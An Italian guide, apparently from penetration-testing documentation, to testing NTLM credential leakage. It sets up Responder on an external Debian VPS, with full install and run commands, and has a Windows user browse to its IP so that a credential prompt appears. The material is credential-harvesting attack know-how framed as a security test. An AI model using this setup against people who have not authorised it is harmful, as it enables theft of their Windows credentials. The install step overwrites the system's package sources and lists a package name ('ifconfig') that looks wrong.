E' possibile richiedere un’autenticazione NTLM mediante un servizio esterno e spingere l’utente a visitare il relativo sito web.

Per effettuare questo test, è necessario possedere un server esterno alla rete aziendale, ad esempio un Virtual Private Server (VPS).

Nel seguente esempio, per semplicità, il sistema operativo da installare nella VPS sarà Debian.

Una volta che il sistema operativo è stato installato, è necessario installare [Responder](https://github.com/lgandx/Responder). Per fare ciò, accedere alla VPS (i.e., mediante SSH) ed eseguire i seguenti comandi sul terminale:
```
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" | sudo tee /etc/apt/sources.list
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys ED444FF07D8D0BF6
sudo apt-get update
sudo apt-get install responder net-tools ifconfig
```
Una volta che il processo di installazione dei pacchetti è terminato, eseguire Responder mediante:
```
sudo responder -I <net-interface>
```
dove `<net-interface>` corrisponde all’interfaccia di rete utilizzata dalla VPS per la connessione ad Internet (i.e., `eth0`). Per verificare quale sia l’interfaccia di rete utilizzata nella VPS, eseguire il comando `ifconfig`. Un esempio del comando è il seguente:
```
sudo responder -I eth0
```
Una volta eseguito, otterremo un output contenente la stringa **Responder IP [<IP-Address>]**. Esso corrisponde all’indirizzo IP con cui Responder è esposto su Internet per inviare richieste di autenticazione NTLM.

Infine, sul client Windows dell’utente, aprire il browser e inserire l’indirizzo IP fornito da Responder all’interno della barra degli indirizzi e premere ENTER.

Verrà mostrata una finestra di popup richiedente le credenziali.
